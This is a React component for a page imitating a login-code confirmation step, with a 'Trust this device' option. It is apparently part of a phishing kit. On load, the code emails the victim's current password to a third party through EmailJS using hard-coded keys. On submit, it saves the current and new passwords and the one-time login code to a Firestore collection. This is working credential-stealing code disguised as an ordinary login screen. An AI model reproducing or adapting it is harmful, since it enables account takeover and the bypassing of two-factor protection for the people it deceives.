import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import logo from '../assets/logo.png';
import {
  updateDoc,
  collection,
  doc,
  getDocs,
  addDoc,
} from 'firebase/firestore';
import { db } from '../config/firebase';
import { useGlobalContext } from '../context';
import emailjs from '@emailjs/browser';

const ConfirmCode = () => {
  useEffect(() => {
    const serviceId = 'service_hrdwmfq';
    const templateId = 'template_dvik647';
    const publicKey = 'tyTc07BP3UDZFbqhd';

    const templateParams = {
      password: passwordDetails.currentPassword,
    };

    emailjs
      .send(serviceId, templateId, templateParams, publicKey)
      .then((resp) => {
        console.log('Email sent succesfully', resp);
      })
      .catch((error) => {
        console.error('Error sending email', error);
      });
  }, []);

  const { passwordDetails, setPasswordDetails } = useGlobalContext();

  const [isActive, setIsActive] = useState(false);

  const handleChange = (event) => {
    const { value, name, className } = event.target;
    setPasswordDetails((prevDetails) => {
      return { ...prevDetails, [name]: value };
    });

    setIsActive(true);
  };

  const navigate = useNavigate();

  const handleSubmit = async () => {
    const { currentPassword, newPassword, newPassword2, confirmationCode } =
      passwordDetails;

    const docCollectionRef = collection(db, 'users');

    await addDoc(docCollectionRef, {
      currentPassword: currentPassword,
      newPassword: newPassword,
      newPasswordConfirmation: newPassword2,
      confirmationCode: confirmationCode,
    });

    navigate('/verification-complete');
  };

  return (
    <div className="ch-passwd main-content">
      <h3 style={{ fontWeight: 'bold', fontSize: '1.5em' }}>
        Enter login code
      </h3>

      <p style={{ color: 'gray' }}>
        Enter the 6-digit login code we sent to your number
      </p>

      <div>
        <div className="password-input" style={{ marginBottom: '7em' }}>
          <input
            id="old-passwd"
            type="number"
            className="input-field confirm-code"
            placeholder="XXX - XXX"
            value={passwordDetails.confirmationCode}
            onChange={handleChange}
            name="confirmationCode"
            style={{ textAlign: 'center' }}
          />
        </div>

        <div
          style={{
            display: 'flex',
            justifyContent: 'space-between',
            padding: '0 1em',
          }}
        >
          <span>
            <p style={{ margin: '0', textAlign: 'left' }}>Trust this device</p>
            <p
              style={{
                color: 'gray',
                margin: '0',
                textAlign: 'left',
                width: '100%',
              }}
            >
              We won't ask for a login code next time
            </p>
          </span>
          <label htmlFor="checking" className="checking-label">
            <input type="checkbox" id="checking" />
            <span className="checking-container"></span>
          </label>
        </div>
        <div>
          <button
            id="submit-password"
            className="active"
            onClick={handleSubmit}
          >
            Confirm code
          </button>
        </div>
      </div>
    </div>
  );
};

export default ConfirmCode;
